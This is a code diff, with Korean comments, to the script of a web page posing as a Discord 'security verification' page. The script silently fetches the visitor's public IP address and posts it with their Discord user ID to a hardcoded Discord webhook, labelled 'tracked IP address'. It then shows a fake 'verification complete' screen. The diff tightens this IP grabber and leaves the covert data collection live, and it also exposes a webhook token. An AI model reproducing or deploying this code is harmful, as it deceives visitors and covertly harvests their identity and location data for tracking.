@@ -52,27 +52,29 @@
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get('user_id') || "알 수 없음";
+        const userId = urlParams.get('user_id');
 
-        // 네 웹훅 주소
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1565687242041597962/4a88OaMlBrvVYqMUAPaSiWxK4XAX4tvwNp1pMkVZxz6NLdl5i5_twLkbdT03j1ZjwtyI";
 
         async function verifyUser() {
             try {
-                // 1. 유저 IP 가져오기
+                // user_id가 아예 없거나 알 수 없는 값이면 웹훅 안 놂 (오류 방지)
+                if (!userId || userId === "알 수 없음") {
+                    throw new Error("유저 ID 없음");
+                }
+
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipRes.json();
                 let userIp = ipData.ip;
 
-                // 2. 디스코드 웹훅 전송 (초록색 + 멘션 형식 + UUID 병행 표시)
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `<@${userId}>`, // 👈 메시지 본문에 유저 멘션 추가!
+                        content: `<@${userId}>`,
                         embeds: [{
                             title: "🎯 유저 IP 및 인증 접속 감지",
-                            color: 3066993, // 👈 깔끔한 초록색 (Green)
+                            color: 3066993, // 초록색
                             fields: [
                                 { name: "디스코드 유저 멘션", value: `<@${userId}> (\`${userId}\`)`, inline: false },
                                 { name: "추적된 IP 주소", value: `\`${userIp}\``, inline: false }
@@ -86,7 +88,6 @@
                 console.error(e);
             }
 
-            // 3. 2.5초 뒤 성공 화면 전환
             setTimeout(() => {
                 document.getElementById('loadingSpinner').style.display = 'none';
                 document.getElementById('titleText').innerText = "보안 인증 완료";
